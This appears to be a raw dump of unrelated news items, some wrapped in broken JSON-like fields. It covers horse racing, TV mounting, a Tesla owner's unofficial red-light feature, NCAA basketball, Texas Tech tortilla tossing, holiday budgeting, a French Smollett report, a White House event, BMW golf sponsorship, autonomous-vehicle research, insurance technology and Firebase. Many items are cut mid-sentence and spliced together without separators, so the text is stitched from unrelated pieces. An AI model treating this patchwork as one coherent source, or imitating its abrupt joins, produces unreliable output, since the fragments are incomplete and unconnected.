skipping away to salute at $19 from I Am Someone who went past the tiring favourite late. \nShe runs them off their feet! \nMiss Leonidas takes down favourite Eduardo in a speedy performance in the Bel Esprit Stakes. pic.twitter.com/4nIA34kx6M \n\u2014 Racing.com (@Racing) April 13, 2019 \n\"She's really fast and has got a great will to win. She just made it tough for everything behind her. She got there quickly, had a couple of cheap sectionals and gave me a good kick at the top of the straight,\" Bowditch said post-race. \nAROUND THE GROUNDS \nSpin plunge comes off \nHe's been a frustrating horse for punters and connections over the journey but Spin brought his A-game to Eagle Farm today. The Snowden-trained gelding, backed from $3.80 into $2.30, settled back from a wide gate before weaving through the field to stroll home in effortless fashion. The horse was clearly a class above his rivals but Larry Cassidy's ride was also a peach. \nRiver races to victory \nPunters narrowed race five at Eagle Farm down to a race in two and they got it spot on, with market leaders River Racer and Hold The Line pairing off at the business end.

From barrier 11, Vorster took the McEvoy galloper back early and saved plenty of ground rounding the home turn. After a bit of ducking and weaving, Classic Weiwei launched late to salute the judge at double-figure odds. The victory completed a double for Vorster after his earlier win aboard Scottish Rogue in race three. \nWe should also acknowledge James Winks' steer on Japanese import A Shin Rook in the fourth at Morphettville - it was also a cracker. \nAgree\ud83d\udc4c \n\u2014 Luke (@WinningisBetter) April 13, 2019 \nPunters Pearler \nJay Ford aboard Shraaoh (Sydney Cup) \nIt was a fair way to end a decade-long drought without a G1 victory, with Ford delivering a 10/10 ride in the Sydney Cup. \nAbsolute peach from Jay Ford!

      "title": "How to Mount a TV Without Making a Mess",
      "text": "It\u2019s one thing to obsess over the aesthetics of your flat-screen TV \u2014 the beveled corners, the screen size, the color temperature. But without thoughtful installation, you can wind up with a beautiful rectangular display surrounded by a rat\u2019s nest of cords, or worse, 40 pounds of glass and electronics that might fall off the wall at any moment. \nTodd Anthony Puma, chief executive of The Source Home Theater in New York, sees poorly installed televisions all the time \u2014 equipment not mounted on the studs or barely held in place with just a couple of screws or anchors. \u201cWhat would happen after a period of time is that the TV would slowly but surely come off the wall, and sooner or later, you have a television that\u2019s on your floor and possibly could injure somebody in the home, which is the worst-case scenario,\u201d he said. \nHere\u2019s what to consider if you want to mount your TV securely without sacrificing the room to a tangle of cords. \nBefore you do anything, make a plan \nThink about all of the devices you\u2019ll need to connect \u2014 not just the boxes, such as gaming consoles or a cable box, but also your audio receiver, speaker or soundbar. Make sure that your shelving unit or cabinet has enough space to hold everything, and that you have enough cables and wire for every device you plan to connect, and that they\u2019re all long enough. \nAt Wirecutter, we recommend always planning to add one more HDMI cord than you think you\u2019ll need, just in case you add a device later, after everything is set up. It\u2019s easier to install that cord now than to do so once everything is in place. \u201cWhen you know how many wires you\u2019re going to have, then you\u2019ll know how to hide them,\u201d Mr. Puma said. \nFor gaming or for a household with a lot of internet use, you may want to consider wiring an Ethernet cable to your TV and console from your modem instead of relying on Wi-Fi. You\u2019ll get the best speed with a direct line for the machines that gobble up the most bandwidth. \nAlso, consider light, wall support and height when you choose a place for the TV. If you\u2019re mounting it on the wall, make sure you\u2019re mounting it to wall studs or solid masonry, and choose a TV mount rated to hold the weight of your set. Wirecutter recommends the Sanus VMPL50A-B1 Tilting Wall Mount , which can tilt up and down and works for TVs from 32 inches to 70 inches in size. For a TV in a cabinet or nook, choose a full-motion mount so you can pull the TV out for viewing. \nChristine Lin, principal for Form & Field, an interior design firm in San Francisco, suggests you avoid placing your TV opposite a window in order to avoid glare. When considering height placement, she said, \u201cI always recommend that the center of the TV should be at eye level when you\u2019re seated. Often TVs are placed too high up on the wall which can cause a lot of neck strain.\u201d \nKeep in mind that some AV sources don\u2019t have cords at all, so they\u2019re much easier to hide. Stick-style streaming media players like the Roku Streaming Stick or Chromecast aren\u2019t much bigger than a thumb and can draw power from your TV\u2019s USB ports. Flat indoor antennas (Wirecutter recommends the Antennas Direct ClearStream Eclipse ), can sometimes stay hidden behind a wall-mounted TV if reception is good enough. \nUse the right electrical cords \nWe don\u2019t recommend hiding regular TV power cords behind the wall. It\u2019s a fire hazard and against the National Electrical Code . A regular power cord behind a wall can overheat or get damaged where you can\u2019t see it. \nMr. Puma explained, \u201cIf cords are not insulated or sealed, like the Romex cables or BX cable that is permitted in our area, when you\u2019re pulling through the wall, a nail or screw can hit it a certain way. One thing leads to another, you turn on the TV after a few hundred times, it lights up and then puts your house on fire.\u201d \nThere is a code-compliant way to pass cords and cables behind drywall, though. Chris Heinonen, Wirecutter\u2019s resident TV expert, recommends a kit that costs about $70 and you can install it on your own. \u201cFor a TV I use something like the PowerBridge TWO-CK Dual Outlet Recessed In-Wall Cable Management System since that\u2019s O.K. with fire code and lets you run the cables inside the wall.\u201d \nIf you live in Chicago and Cook County, Illinois or New York City, PowerBridge offers a compliant metal junction box and metal-clad wire version. (Check your local building code to make sure you\u2019re getting the right version if you plan to do this, though.) Cables should also be rated CL \u2014 which you can find on the packaging or in the product description online \u2014 for wall insulation. \nIf you mount your TV on a brick wall and install a power bridge, you can use paintable cord covers to keep them all bundled and out of sight. Mr. Heinonen recommends cord housing like the Legrand CMK10 Cable Management System, which has double-sided adhesive so you can run it along a window frame or art and then paint it to match the wall color. \nVentilate your gear properly \nAll of the devices you connect to your entertainment system produce plenty of heat, which can shorten their lives or damage other electronics without proper ventilation. \n\u201cThe one thing I always recommend is to keep your equipment properly ventilated,\u201d Mr. Puma said. \u201cDon\u2019t put a TV in the perfect fitted box; make sure there\u2019s a little space, so if you wanted to, you could get your fingers in there to take the TV down, or if the service guy has to come in from one of the TV manufacturers, they\u2019ll be able to easily maintenance it as well.\u201d \nGive everything enough clearance, and make sure any cabinetry you use has ventilation holes for heat. You may even prefer to install a cabinet cooling fan to circulate air. \nKnow when to call a professional \nIf you find that the power outlet isn\u2019t near enough to your setup, avoid using an extension cord. Hire an electrician to add an outlet where you need it if you\u2019re not absolutely confident doing it yourself. According to research from the National Fire Protection Association , electrical distribution and lighting equipment (including cords) were the leading causes of fires in the living room and bedroom from 2012 to 2016, with extension cords being the most common cause of fire among cords and plugs. \nYou should also call a pro if you\u2019re dealing with challenging wall materials like brick, which is naturally inconsistent, or walls with plumbing on the other side. \u201cI think if there is anything extra on the walls like tile you\u2019ll probably want a professional to deal with that drilling unless you\u2019re pretty handy,\u201d Ms. Lin said. \nSign up for the Wirecutter Weekly Newsletter and get our latest recommendations every Sunday. \nA version of this article appears at Wirecutter.com .",

      "title": "Hacker Gets Tesla On Autopilot To Stop Itself At Red Light: Video",
      "text": "Hacker Gets Tesla On Autopilot To Stop Itself At Red Light: Video \n23 H BY DOMENICK YONEY \nOfficial system alerts drivers to the danger of red lights running. \nThe video above could be something of a preview of a feature coming, eventually, to Tesla Autopilot and so-called Full Self-Driving systems. In it, you\u2019ll see a Model S recognize traffic lights and come to a stop automatically when they are red. \nMore With Tesla Autopilot: \nThe car in question has been hacked by its presumed owner to add the extra capability. This is not something that other Tesla vehicles can do. The automaker did, recently, update its Autopilot-equipped fleet, giving the cars the ability to \u201csee\u201d traffic lights and give a warning \u201c if it detects that you are about to run a red light. \u201c. It\u2019s this change in the car\u2019s software that allowed the hack to take things one step further. \nThe system is not perfect. As noted in the video description (added below), at the 5:12-minute mark in the footage, the driver had to intervene to keep it from proceeding into an intersection despite the red light. Still, it does seem to work in other instances, including at the beginning of the clip. As you can see in the screenshot below, a small traffic light icon with the top red slot illuminated is being displayed on the car\u2019s screen at the same time as Autopilot is engaged (as evidenced by the steering wheel icon in blue). \nInterestingly, the uploader notes that the vehicle sometimes slows on the approach to intersections when it\u2019s unsure of the status of the traffic light. An example of this is at the 6:26-minute mark. They also claim that it will come to a halt at stop signs, though that is not demonstrated in the video. \nTo see how the Autopilot system warns of red light running, we\u2019ve added a video below of it being demonstrated by an owner in his Model 3 . \nVideo description: \nOk, this is not perfect yet, but this is production firmware 19.8.3 and it does a lot of new tricks. \nObviously you cannot yet enable it in GUI, and for a good reason that I\u2019ll list below. \nIt can also stop for stop signs but I cannot find a good location to video it without putting anyone in danger so that\u2019s for another time. \nnice touch \u2013 if it is unsure of current light status \u2013 it would approach the intersection carefully so it can stop gently should it actually be a red light \u2013 see at 6:26 \nSo now the problems. it\u2019s actually not very robust at telling red from green in some conditions, see at timestamp 4:05 how it flipflops. and then nearly runs a red light at 5:12 and I need to intervene. \nOverall I am very impressed. \nCategories: Tesla , Videos",

      "text": "Alex Brandon/Associated Press \nThe unlikeliest collection of programs will head to Minneapolis, Minnesota for the 2019 men's Final Four. \nAuburn and Texas Tech are making their first-ever Final Four appearances, while Virginia is back at this stage of the NCAA men's basketball tournament for the first time since 1984. \nMichigan State is the most experienced program by far of the bunch, as Tom Izzo has brought the Spartans to eight Final Fours. \nSaturday's matchups might not be intriguing on paper to some casual fans, but we should witness a pair of high-quality basketball games at U.S. Bank Stadium. \n2019 NCAA Men's Tournament Bracket \nOdds \nB/R Betting @br_betting \n#FinalFour odds \ud83d\udcb0 - Michigan State -2.5 vs. Texas Tech - Virginia -5.5 vs. Auburn \nPredictions \nMichigan State over Texas Tech \nUsually in pressure-packed games with a championship berth on the line, you'd lean toward the experienced team to pull out a victory. \nMichigan State carries much more experience than Texas Tech, and it'll likely grow as a betting favorite, but the game will be closer than most think. \nThe Red Raiders won't back down from a challenge, and with the most NBA-ready prospect on the floor in Jarrett Culver, they'll cause plenty of trouble to the Spartans. \nBut the Spartans will eventually pull away behind the backcourt leadership of Cassius Winston and impressive play in the paint. \nIn Xavier Tillman, Kenny Goins and Nick Ward, the Spartans have a trio of players capable of doing damage in the paint against Texas Tech's Tariq Owens. \nRob Carr/Getty Images \nOwens defended tough in the paint in the Elite Eight against Gonzaga, as he recorded seven rebounds and three blocks, but the Spartans bring an entirely different challenge to the hardwood. \nTillman and Ward are wide-bodied big men who will make their presence known with physical play on the blocks. \nAs we saw in Michigan State's win over Duke, Tillman especially doesn't back down from a challenge, as he constantly attacked the rim despite Zion Williamson hovering in the background. \nIn four NCAA tournament games, Tillman reached double digits in points, earned a double-double against Bradley and came close to two more double-doubles versus LSU and Duke. \nIf Tillman and Ward, who will be another week along in the recovery process for his broken left hand, bruise down low and get Owens into foul trouble, the Spartans will control the glass. \nNo matter how successful the Michigan State big men are, Winston will still play a major role as a scorer, distributor and defender. \nAgainst Duke, Winston recorded 20 points , 10 assists and four steals, and if he replicates those numbers by frustrating Culver and the Texas Tech guards, Chris Beard's team is going to have a rough game. \nThe Red Raiders won't go away easily because of their three-point shooting, but eventually Winston, Tillman and Ward will wear them down and break open a decent advantage in the latter stages of the second half to move on to the national championship. \nVirginia over Auburn \nPicking both favorites to win in the Final Four goes against the set of results we witnessed in the Elite Eight, but we have trust in Virginia to set up a clash with the Spartans in the title game. \nSome may think the Cavaliers will have trouble dealing with Auburn's up-and-down pace, but they have experience playing against a high-octane offense. \nTony Bennett's team will draw from its experience of holding North Carolina to 61 points back on February 11 to find ways to stop a dangerous transition attack. \nKevin C. Cox/Getty Images \nIn the win over the Tar Heels during ACC play, the Cavaliers held Roy Williams' team to a 9-for-30 mark at the three-point line and only allowed it to get to the free-throw line on seven occasions. \nBy playing disciplined defense around the three-point line, the Cavaliers can produce similar defensive numbers against Auburn. \nExpect the Cavaliers to have plenty of motivation to shore up their defenses after conceding 14 triples in the overtime win over Purdue. \nIf Ty Jerome, Kihei Clark and others neutralize Auburn's three-point shooting threat, Virginia should be able to open up a sizable lead. \nThe key on offense for Virginia will be its big men, as Kyle Guy and Mamadi Diakite come into Minneapolis after combining for 39 points in the Elite Eight. \nGuy and Diakite will take advantage of the absence of Chuma Okeke to control the battle in the paint and force Auburn to play from behind and take lesser-percentage shots from beyond the arc. \nAuburn survived down low without Okeke against Kentucky, but Horace Spencer, Anfernee McLemore and Danjel Purifoy were all in foul trouble. \nIf Virginia plays physical down low and forces the Auburn big men into foul trouble once again, the Cavaliers should be able to impose their will on the Tigers. \nFollow Joe on Twitter, @JTansey90. \nStatistics obtained from ESPN.com .",

      "text": "Texas Tech fans have a thing about tortillas, which led to some interesting scenes in the Red Raiders' NCAA championship game against Virginia on Monday in Minneapolis. \nAt one point, officials paused the action briefly to pick up a tortilla from the court. According to the Minneapolis Star Tribune , other tortillas were also tossed on the court, prompting some Texas Tech fans to stand up on their chairs and warn others about tossing tortillas. \nOne fan even reportedly made a \"T\" sign, warning the team could face a technical foul.\u200b \nThese incidents led to the inevitable: Security officers started confiscating tortillas. \nNCAA title game stopped briefly because a tortilla got launched into the court from the Texas Tech student section. Not the first to fly and now security is starting to confiscate a bunch. pic.twitter.com/q18K93dTp4 \n\u2014 Oskar Garcia (@oskargarcia) April 9, 2019 \nThose unfamiliar with the longstanding Texas Tech tradition may be thinking, \"Tortillas? What? Why?\" \nAs the story goes, back in 1992, as Texas A&M prepared to visit Texas Tech for a big game, an ESPN sportscaster demeaned Lubbock by saying the there was \"nothing but Tech football and a tortilla factory in Lubbock.\" \nSo fans took the cue, and, instead of throwing plastic drink cup lids on the field as they'd been doing for several years, they began hurling tortillas, as they did again Monday night: \nClassic Texas Tech, already throwing tortillas on the court!! \ud83e\udd26\u200d\u2642\ufe0f\ud83e\udd26\u200d\u2642\ufe0f\ud83e\udd37\u200d\u2642\ufe0f\ud83e\udd37\u200d\u2642\ufe0f #redraiders #texastech @marchmadness @FinalFour pic.twitter.com/0xfGzZWLvx \n\u2014 Steven Sturgeon (@pistolpete2002) April 9, 2019 \nIt's a bizarre tradition, but a fun one, and it left some observers speculating on Twitter about the composition of the tortillas, whether the tossers were righties or lefties, etc. \nNot 100% positive because I didn't taste it, but I'm pretty sure from color and trajectory that the stoppage tortilla was yellow corn thrown by a righty (who got a nice arc on it). Tech kids definitely armed with flour, too. \n\u2014 Oskar Garcia (@oskargarcia) April 9, 2019 \nConfiscating Tortillas would be a good band name. \n\u2014 Jim Souhan (@SouhanStrib) April 9, 2019 \nVirginia led Texas Tech, 32-29, at halftime.",

The results can have a huge financial impact. By approaching holiday shopping with the same discipline that investment professionals and investors approach constructing a portfolio, you can maximize your holiday experience while minimizing the impact to your wallet. \nNo. 1: Think long-term \nWhen investing for a long-term goal, such as retirement, it\u2019s crucial to have a strategy in place. That way, instead of making knee-jerk reactions when the market wobbles, investors and advisers can make appropriate shifts based on personal circumstances, accounting for short-term requirements without sacrificing long-term goals. It can feel tempting to forgo that strategy to jump on the hottest investment trend that\u2019s hitting the headlines, but ultimately, every investment opportunity should be evaluated with the end goal in mind. \nThe same is true for gifting. It\u2019s easy to get distracted while shopping by the flashiest display for the season\u2019s hottest gift but evaluating whether your present will maintain that value after December can help you purchase gifts with deeper meaning and a longer shelf life. Think about purchasing gifts that are timeless \u2014 such as a classic coat or watch that can be used for years to come. \nAnother avenue to consider? The gift of experience. Research from the University of Toronto found that despite the fact that 78% of people purchase material gifts for the holidays, giving the gift of an experience is more powerful for strengthening the relationship between giver and recipient. Just make sure that your gift of experience falls within your budget, so that you can avoid a holiday spending hangover . \nWhen you take the time to find a gift with long-term value, both you and the gift recipient will reap the benefits \u2014 similar to the satisfaction and peace of mind you experience when building an investment plan with a long-term mind-set. \nNo. 2: Don\u2019t let emotions impact your strategy \nEmotions are a natural symptom of investing. After all, you\u2019re placing your money into a market that experiences unexpected swings that can have a serious impact on your life savings. Trying to time the market is difficult for most people because we\u2019re wired to seek immediate results, and those instincts can lead us to making rash, emotional decisions that throw investments off course. The reality is, there will always be good and bad times in the market, and keeping your emotions in check is an essential step for a successful investment strategy. Working with a fiduciary financial adviser can help you to mitigate some of the emotions that come with human nature and keep your strategy on track during stressful times. \nSimilarly, there are many emotions involved with the holiday season. The stress of finding the perfect gift can feel like a roller coaster, which leads you to making rash buying decisions, like jumping on a flash sale just because the markdown is significant. This can lead to overspending, with six in 10 people feeling pressure to overspend this holiday season. \nHaving a plan ahead of time, such as an outline of who you are shopping for, what you\u2019d like to purchase, and how much money you plan to spend on each gift, can help mitigate impulsive decisions. You could also consider assigning yourself a \u201cgifting adviser\u201d who can serve as your voice of reason when hitting the stores. Just like a financial adviser, a neutral third party can help you determine whether your spending is within reason and whether or not your purchase is going to hold its value. \nNo. 3: Minimize gifting \u2018risk\u2019 \nOne way that investment professionals mitigate risk in a portfolio is through proper diversification. Diversification helps ensure that you have the right mix of investments across different asset classes (such as equities, fixed income and alternatives) to meet your goals, and that one investment can\u2019t negatively impact your portfolio too severely. \nHowever, when it comes to giving, diversification won\u2019t net the same results as it can with investing. Too often we try to give a gift to everyone on our nice list \u2014 family, friends, colleagues, kids\u2019 teachers and beyond \u2014 and in turn spread ourselves too thin in terms of spending. This year, minimize your diversification and dedicate your holiday spend to those that matter most. By reserving your funds for a select few, you can be more personal and strategic when it comes to your shopping and ultimately have a better spending experience. \nApproaching your shopping as you would approach your portfolio isn\u2019t meant to make you feel like Scrooge. Instead, it can help you maximize the way that you shop to make this season the best one to date, without sacrificing your own financial health in the process. \nIt\u2019s important to remember that while the holiday season is a special time of the year, the spending decisions you make now will follow you into the new year, so holding yourself accountable now will be a gift to yourself in the long-run. \nLacey Cobb is a portfolio manager and CFP at Personal Capital .",

Selon Jussie Smollett, les deux hommes auraient \u00e9galement plac\u00e9 une corde autour de son cou et l\u2019auraient asperg\u00e9 d\u2019eau de javel. \nFils d\u2019une militante des droits civiques amie d\u2019Angela Davis, l\u2019acteur am\u00e9ricain est lui-m\u00eame un activiste 2.0, et alimente r\u00e9guli\u00e8rement de posts engag\u00e9s ses comptes Instagram et Twitter (respectivement 5,3 millions et 1,3 million d\u2019abonn\u00e9s). Deux jours apr\u00e8s l\u2019agression, les messages de soutien abondent, et Donald Trump lui-m\u00eame, interrog\u00e9 sur l\u2019affaire, la qualifie d \u2019\u00ab horrible \u00bb . \nD\u00e9nonciation calomnieuse \nMais, tr\u00e8s vite, la machine se grippe : Smollett refuse de confier son t\u00e9l\u00e9phone portable aux enqu\u00eateurs (il finira par leur fournir une version expurg\u00e9e et plus ou moins inutilisable de son historique d\u2019appels) et les policiers \u00e9chouent \u00e0 trouver une vid\u00e9o pour corroborer son r\u00e9cit.

While the president\u2019s Mideast envoy Jason Greenblatt attended the gathering, he did not address the crowd, one attendee told The Times of Israel. \nUS President Donald Trump, Jared Kushner, the president\u2019s son-in-law and senior adviser, did Ivanka Trump, the president\u2019s Jewish daughter, did not attend. \nIn its invitation, the White House had billed the event as \u201ca discussion with key administration officials on pertinent issues impacting the community.\u201d \nHowever,none of the speakers mentioned Prime Minister Benjamin Netanyahu\u2019s election eve promise to annex West Bank settlements, a move that has been vehemently protested by liberal Jewish leaders, who were not invited to the soiree, and by pro-Israel Democrats who have warned it would cause a political emergency in Washington by undermining the viability of an eventual two-state solution. \nThe keynote speaker, it turned out, was Israel\u2019s ambassador to the United States Ron Dermer, who said he felt very comfortable and confident in the Trump administration to put forward a peace proposal that took into account Israel\u2019s security concerns, two sources told The Times of Israel. \n\u201cI know a lot of people are concerned that the peace plan is going to be coming out soon,\u201d Dermer reportedly said, according to Jewish Insider . \nRon Dermer, Israel\u2019s ambassador to the United States, speaks at the Economic Club of Detroit in Detroit, Michigan, on June 4, 2018. (AP Photo/Paul Sancya) \n\u201cBut I have to say, as Israel\u2019s ambassador, I am confident that this administration \u2014 given its support for Israel \u2014 will take Israel\u2019s vital concerns into account in any plan they will put forward.\u201d \nFor months, Trump\u2019s team tasked with brokering an accord has said they would wait until after Israel\u2019s April 9 election to reveal its proposal. A Channel 13 report said that the White House was now aiming for mid-June. \nOther speakers at Tuesday\u2019s event included Elan Carr, the State Department\u2019s anti-Semitism envoy, and Rabbi Levi Shemtov, who directs American Friends of Lubavitch (Chabad) spoke about the upcoming White House Passover reception. \nCarr told the attendees that after the Passover holiday he will be traveling in his new capacity as anti-Semitism envoy, including with stops in the Middle East to address anti-Semitism in the Arab world and their textbooks, one source said. \nLeaders from three of the four major Jewish denominations \u2014 the Reform, Reconstructionist and Conservative movements \u2014 were not invited. \nSince Trump took office in January 2017, non-Orthodox Jewish leaders have frequently criticized the president on matters ranging from his rhetoric to his immigration policies to even, at time, his approach toward Israel. \nOther groups that were excluded were the Anti-Defamation League, the country\u2019s leading Jewish civil rights group; J Street, the liberal Mideast advocacy group; and HIAS, a Jewish immigration advocacy group. \nStuart Weinblatt, a conservative rabbi of Congregation B\u2019Nai Tzedek in Potomac, Maryland, called the summit \u201cmore of a reception than a briefing.\u201d \n\u2014 They call me Mr. Kornbluh \u270d\ufe0f (@jacobkornbluh) April 17, 2019 \n\u201cMaybe they were trying to get rid of the hummus in the White House before the holiday,\u201d he said.",

      "text": "BMW, the PGA TOUR and the Western Golf Association (WGA) to continue the BMW Championship success story until 2022. \nThe agreement further strengthens BMW\u2019s involvement in golf worldwide. \nSince the introduction of the playoffs in 2007, the BMW Championship has boasted one of the best line-ups in world golf, featuring the 70 best players on the PGA TOUR. \nThe BMW Championship has been voted \u2018PGA TOUR Tournament of the Year\u2019 on four occasions. \nSince 2007, the BMW Championship has raised more than 30 million US dollars for the Evans Scholars Foundation. \nChicago/Munich. The long-standing relationship between BMW and the Western Golf Association was extended with today\u2019s announcement that BMW will continue as the title sponsor of the BMW Championship. With this new agreement, BMW will host the BMW Championship, the penultimate event on the PGA TOUR\u2019s FedExCup Playoffs, through 2022. \n\u201cWe are very excited to remain the title sponsor of the BMW Championship, one of golf\u2019s premiere events,\u201d says Bernhard Kuhnt, president and CEO, BMW of North America. \u201cThe BMW Championship provides us a global platform to connect with our network of owners, dealers and golf fans. Moreover, we have been proud partners alongside the Evans Scholars Foundation for 13 years, helping to provide opportunities for students to follow their dreams. We are looking forward to continuing those efforts in support of these deserving young caddies.\u201d \nAll net proceeds from the BMW Championship benefit the Evans Scholars Foundation, which provides full housing and tuition college scholarships to hardworking young caddies. Since the tournament\u2019s inception in 2007, the BMW Championship has raised more than $30 million for the Evans Scholars Foundation. For the coming 2019-2020 academic year, a record 1,000 caddies will be attending 18 major colleges and universities on Evans Scholarships. Currently there are more than 11,500 Evans Scholarship alumni nationwide. \nWith the renewal of the BMW Championship, the premium car manufacturer strengthens its worldwide commitment to the sport of golf. In addition to the PGA TOUR, BMW is also the Worldwide Partner of the Ryder Cup, beginning in 2020 at Whistling Straits in Wisconsin, as well as the 2022 event in Rome, Italy. BMW has had a connection with the event dating back to 2006, with the European Team. \n\u201cAs we increase our focus on luxury vehicles such as the all-new BMW 8 Series and the first-ever BMW X7, the BMW Championship and the golf platform present a unique opportunity to engage customers and dealers,\u201d says Uwe Dreher, vice president of marketing, BMW of North America. \u201cThe BMW Championship\u2019s move to August guarantees even more visibility and opportunities to showcase our brand. Coupled with BMW\u2019s support of the Ryder Cup, we are able to strengthen our long-standing relationship with the sport.\u201d \nThe extension underlines BMW's leading role as a long-term partner of global golf. Over the next few years, the company will be a European Tour partner and will be the title partner of the BMW PGA Championship (19th to 22nd September 2019, Wentworth Club, London), and will continue to host the BMW International Open (GC M\u00fcnchen Eichenried) in June. The BMW Ladies Championship will celebrate its LPGA Tour debut from 24th to 27th October 2019, in Busan (South Korea). For over 30 years, BMW has also been organising the largest international tournament series for amateur players, the BMW Golf Cup International. Since last year, the company has been using the innovative format of the BMW TrackMan Open to put golf firmly in the digital age and appeal to a younger target audience. \nThe history of the BMW Championship dates back to 1899, when the tournament celebrated its debut as the Western Open. This makes it the third-oldest tournament on the PGA TOUR calendar. Only the Open Championship and the U.S. Open have been around for longer. Since the tournament became the penultimate playoff event, it is open only to the 70 best players in the FedExCup standings and just 30 of them can qualify for the subsequent finale, the TOUR Championship in Atlanta. \nThe BMW Championship was first named \u201cPGA TOUR Tournament of the Year\u201d in 2008, an accolade that was awarded for another three consecutive years between 2012 and 2014 \u2013 an achievement that remains unmatched to this day. \nNext year\u2019s BMW Championship will once again be contested in the Chicago area, at Olympia Fields Country Club\u2019s North Course from August 20-23, 2020. \nBMW Championship: Previous Winners and Venues. \n2018 Keegan Bradley (USA) Aronimink Golf Club (Philadelphia) \n2017 Marc Leishman (AUS) Conway Farms Golf Club (Chicago) \n2016 Dustin Johnson (USA) Crooked Stick Golf Club (Indianapolis) \n2015 Jason Day (AUS) Conway Farms Golf Club (Chicago) \n2014 Billy Horschel (USA) Cherry Hills Country Club (Denver) \n2013 Zach Johnson (USA) Conway Farms Golf Club (Chicago) \n2012 Rory McIlroy (NIR) Crooked Stick Golf Club (Indianapolis) \n2011 Justin Rose (ENG) Cog Hill Golf & Country Club (Chicago) \n2010 Dustin Johnson (USA) Cog Hill Golf & Country Club (Chicago) \n2009 Tiger Woods (USA) Cog Hill Golf & Country Club (Chicago) \n2008 Camilo Villegas (COL) Bellerive Country Club (St. Louis) \n2007 Tiger Woods (USA) Cog Hill Golf & Country Club (Chicago)",

      "text": "North Carolina Pays Researchers to Prep for Autonomous Vehicles \n[Stay on top of transportation news: Get TTNews in your inbox .] \nTeams of researchers based at three state universities will spend the next three years developing ways to help North Carolina prepare for autonomous vehicles and other new transportation technologies. \nThe state Department of Transportation announced Dec. 17 that it will give $1 million to each of the three teams to study transportation challenges facing the state. Most of those challenges have to do with technology, notably the expected introduction of electric and autonomous or self-driving cars and trucks. \n\u201cDisruptive technologies will reshape the transportation industry,\u201d Transportation Secretary Jim Trogdon said in a statement. \u201cThis research will provide North Carolina with data we need to prepare for these changes.\u201d \nThe research programs, called University Transportation Centers for Excellence, will be based at North Carolina State, University of North Carolina-Chapel Hill and North Carolina A&T, but will include members from other schools, including Duke and North Carolina Central. \nEach center will have a different focus: \n\u2022 N.C. A&T will host the North Carolina Transportation Center on Connected and Autonomous Vehicle Technology, or NC-CAV. The university will have a test track at Gateway Research Park in Greensboro and will work with the city to build a road between downtown and the university campus exclusively for autonomous vehicles. \n\u2022 UNC\u2019s Highway Safety Research Center will focus on the effect of autonomous vehicles and other technologies on safety, accessibility, mobility and public policy. \n\u2022 N.C. State\u2019s Institute for Transportation Research and Education will research the use of cameras and sensors to predict traffic and reduce congestion. It also will research the management of fleets of autonomous vehicles and look for ways to use transportation to improve access to health care in rural areas. \nTrogdon has emphasized the need for North Carolina to prepare for new transportation technologies. In January, NCDOT will co-host a transportation summit on the future of transportation. The featured speaker will be Tony Seba, a Silicon Valley entrepreneur who heads a think tank called RethinkX and who predicts that by 2030 nearly all road travel in the U.S. will be done via electric, on-demand autonomous vehicles owned by fleets. \nWant more news?

      "text": "The next big competitive advantage in insurance will be created by the ability to capitalise on \u201cmomentary markets,\u201d or personalised policy and service offers tailored to customers\u2019 unique life moments and delivered in real-time, according to a new report from Accenture. \nThe report, Technology Vision for Insurance 2019 , notes that we\u2019re entering a new \u201cpost-digital\u201d era, where digital is no longer a differentiating advantage \u2014 and now the price of admission. \nThe report notes that while the average insurance customer engages with his or her insurer only once or twice a year, insurers are looking to increase engagement through real-time risk protection and mitigation services. \nThree in five insurers (60 per cent) are already using technology to build products or services that boost the frequency and quality of customer engagement, with another 35 per cent planning to so in the next year. \n\u201cThere\u2019s an opportunity for insurers to increase and improve their touchpoints with customers and forge a stronger, more personalised experience by harnessing customers\u2019 digital footprints, but they\u2019ll need to digitalise their core before they can reach these new heights,\u201d said Daniele Presutti, who leads Accenture\u2019s Insurance practice in Europe. \n\u201cMost traditional insurers are behind the curve in this \u2018post-digital\u2019 world, with a heavy reliance on mainframe technology. This makes it difficult for them to explore opportunities in the cloud and technologies such as AI to transform their operations, accelerate time to market and improve security. It also makes them vulnerable to the early adopters of these technologies as well as the nimbler \u2018post-digital\u2019 upstarts.\u201d \nMeanwhile, three in five insurers (59 per cent) are forming distribution relationships with non-traditional partners to reach customers in new ways and create new value for them. However only one-quarter (26 per cent) of respondents know for sure that their ecosystem partners are working as diligently as they are to improve their security resilience. Leading insurers will recognise that as they collaborate with entire ecosystems to deliver new products, services and experiences, security must be a priority. \nThe report also suggests that failure to master social, mobile, analytics and cloud (SMAC) technologies will leave insurers unable to serve even the most basic demands of a post-digital world and prevent them from embracing the next wave of digital disruption \u2014 distributed ledger technology, AI, extended reality, and quantum computing (DARQ). This new set of technologies will let insurers reimagine the entire industry and its role in the world. \n\u201cFor insurers to excel in the \u2018post-digital\u2019 environment, they\u2019ve got to become more agile and implement SMAC as a core competency before they can rotate to newer technologies, including distributed ledger technology and AI,\u201d said Jim Bramblet, who leads Accenture\u2019s Insurance practice in North America. \n\u201cThey\u2019ll also need to carefully choose the customised and on-demand customer experiences they want to target and work backwards to map out how to get there, determining which ecosystem partners they need and where their place in that ecosystem will be.\u201d",

      "title": "Firebase: Get Your Apps Off the Ground Blazing Fast",
      "text": "Google has invested heavily to make Firebase a full-featured application platform for web. It's dirt cheap to use. It's reliable. It saves up to 50% of your dev time. \nFirebase is all you need... with a few exceptions. Firebase is still missing search functionality, but we can plug that hole with Algolia . Google Cloud Platform provides a few more ancillary services such as DNS, Cloud SQL for reporting data and Bigtable for graph data. \nFirebase includes nearly everything I need to build small to medium-sized apps quickly. \nA Quick History \nFirebase was birthed from a Y Combinator company that was acquired by Google in 2014. \nFirebase is a classic disruptive company . It started as a quick prototyping tool for developers who wanted to move quickly but didn't necessarily need much scale or sophistication. \nThey've spent the last eight years building capabilities from that original base of passionate freelancers and indie devs, and as a cornerstone of Google Cloud Platform's strategy, Firebase is fighting its way into the larger corporate market. \nWhat is Firebase? \nFirebase is a suite of managed services that are focused on developer experience over raw power. \nFirebase handles your authentication, data storage, document storage, serverless functions, and much more. \nAWS and GCP appeal to large, corporate projects that can take years to ship. Use Firebase when you need to ship yesterday. \nYou may have heard that Firebase is just for startups or prototypes, or that it fails at scale or gets super expensive. Well... things have changed. A lot. \nA Quick Example \nWe have been Twitch streaming here at Scotch and we built a real-time voting app using Firebase. Built in a couple hours, you can see everyone on the Twitch stream voting and seeing the update on screen in real-time: Watch Here \nFirebase Features \nFirebase comes with a ton of things out of the box. You can pick and choose what you want to use and leave what you don't need. You may even come back in the future and use those extra features as your application grows. \nThe amount of things that come with Firebase is staggering. It's basically a 